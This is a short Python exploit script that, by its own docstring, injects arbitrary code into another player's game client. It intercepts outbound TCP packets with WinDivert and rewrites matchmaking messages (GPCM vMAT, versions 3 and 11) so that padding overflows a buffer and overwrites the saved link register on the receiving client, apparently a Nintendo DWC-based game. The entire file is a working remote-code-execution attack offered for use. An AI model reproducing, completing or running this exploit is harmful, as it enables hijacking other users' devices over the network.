"""This code will inject arbitrary code into a client's game.

You are fully responsible for all activity that occurs while using this code.
The author of this code can not be held liable to you or to anyone else as a
result of damages caused by the usage of this code.
"""

__author__ = 'MikeIsAStar'
__date__ = '06 Nov 2023'

import re
import sys

if sys.version_info < (3, 10):
    sys.exit("This program requires Python 3.10 or above !")

try:
    import pydivert
except ModuleNotFoundError:
    sys.exit("The 'pydivert' module is not installed !")


# Variables
LR_SAVE = b'\x41\x41\x41\x41'
assert len(LR_SAVE) == 0x04
PADDING = b'MikeStar'
assert len(PADDING) > 0x00

# Constants
DWC_MATCH_COMMAND_INVALID = b'\xFE'
DWC_MATCHING_VERSION_3_PADDING_LENGTH = 0x22C
DWC_MATCHING_VERSION_11_PADDING_LENGTH = 0x23C
FINAL_KEY = b'\\final\\'
WINDIVERT_FILTER = 'outbound and tcp and tcp.PayloadLength > 0'


def try_modify_payload(payload):
    message_pattern = rb'\\msg\\GPCM([1-9][0-9]?)vMAT'
    message = re.search(message_pattern, payload)
    if not message:
        return None

    matching_version = int(message.group(1))
    match matching_version:
        case 3:
            padding_length = DWC_MATCHING_VERSION_3_PADDING_LENGTH
        case 11:
            padding_length = DWC_MATCHING_VERSION_11_PADDING_LENGTH
        case _:
            print(f'Modifying GPCM{matching_version}vMAT messages is not yet supported !')
            return None

    payload = payload[:message.end()]
    payload += DWC_MATCH_COMMAND_INVALID
    payload += (PADDING * (padding_length // len(PADDING) + 1))[:padding_length]
    payload += LR_SAVE
    payload += FINAL_KEY

    print('Modified a GPCM message !')

    return payload


def main():
    try:
        with pydivert.WinDivert(WINDIVERT_FILTER) as packet_buffer:
            for packet in packet_buffer:
                payload = try_modify_payload(packet.payload)
                if payload is not None:
                    packet.payload = payload
                packet_buffer.send(packet)
    except KeyboardInterrupt:
        pass
    except PermissionError:
        sys.exit('This program must be run with administrator privileges !')


if __name__ == '__main__':
    main()
